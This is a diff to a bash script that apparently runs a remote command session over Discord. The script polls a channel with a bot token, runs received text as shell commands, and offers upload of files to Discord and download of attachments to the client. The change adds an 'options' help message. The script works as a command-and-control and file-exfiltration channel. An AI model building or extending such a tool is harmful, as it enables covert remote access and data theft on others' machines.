@@ -58,6 +58,20 @@ Authenticate() {
     fi
 }
 
+Option_List() {
+        json_payload="{
+          \"content\": \"\",
+          \"embeds\": [
+            {
+              \"title\": \":white_check_mark:   **Session Connected**   :white_check_mark:\",
+              \"description\": \"**OPTIONS LIST**\n\n- **options**  - Show the options list\n- **pause**    - Pause this session (re-authenticate to resume)\n- **close**    - Close this session permanently\n- **upload**   - Upload a file to Discord [upload path/to/file.txt]\n- **download** - Download file to client [attach to 'download' command]\",
+              \"color\": 16777215
+            }
+          ]
+        }"        
+        curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
+}
+
 get_recent_message() {
     recent_message=$(curl -s -H "Authorization: Bot $token" "https://discord.com/api/v9/channels/$chan/messages?limit=1")
     user_id=$(echo "$recent_message" | grep -o '"author":{"id":"[^"]*' | grep -o '[^"]*$')
@@ -200,6 +214,13 @@ execute_command() {
             echo "Received 'Download' command."
             command="$1"
             download_attachment
+            return
+        fi
+
+        if [ "$1" == "options" ]; then
+            echo "Received 'Options' command."
+            Option_List
+            return
         fi
 
         command="$1"
